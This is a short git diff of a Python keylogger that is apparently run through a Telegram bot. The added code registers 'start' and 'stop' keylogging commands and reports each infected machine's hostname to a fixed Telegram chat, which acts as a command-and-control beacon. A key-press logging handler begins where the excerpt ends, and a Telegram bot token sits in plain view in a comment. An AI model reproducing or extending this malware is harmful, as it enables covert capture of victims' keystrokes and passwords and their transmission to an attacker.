@@ -5,6 +5,7 @@ import telebot
 from telebot import types
 import os
 import subprocess
+import socket
 
 print("  _______   _      _						")
 print(" |__   __| | |    | |						")
@@ -18,13 +19,32 @@ print("									")
 print("						Alex Franco		")
 print("									")
 
+
+commands = {
+                'start': 'Inicia keylogger.',
+                'stop': 'Para el keylogger y envia teclas.',
+}
+
+help = "Comandos disponibles: \n \n"
+for key in commands:
+	help += "/" + key + ": "
+	help += commands[key] + "\n"
+
+
+
 TOKEN = raw_input('Introduce TOKEN: ') # 372274699:AAH8t7ML7zdXoCSxiJOqPSSFmTILQ68zflY
 bot = telebot.TeleBot(TOKEN)
-print(" [*] Enviar mensaje a telegram conforme se ha establecido conexion, FIX THIS")
+chat_id = "184832283" # -184142656
+hostname = str("[/] ") +  socket.gethostname() + str(" connected")
+bot.send_message(chat_id, hostname)
+bot.send_message(chat_id, help)
 
-chat_id = "-184142656"
+print(" [*] Bot connected, waiting for order...")
+
 
 log_file='file.log'
+
+
 
 def OnKeyPress(event):
   fob=open(log_file,'a')
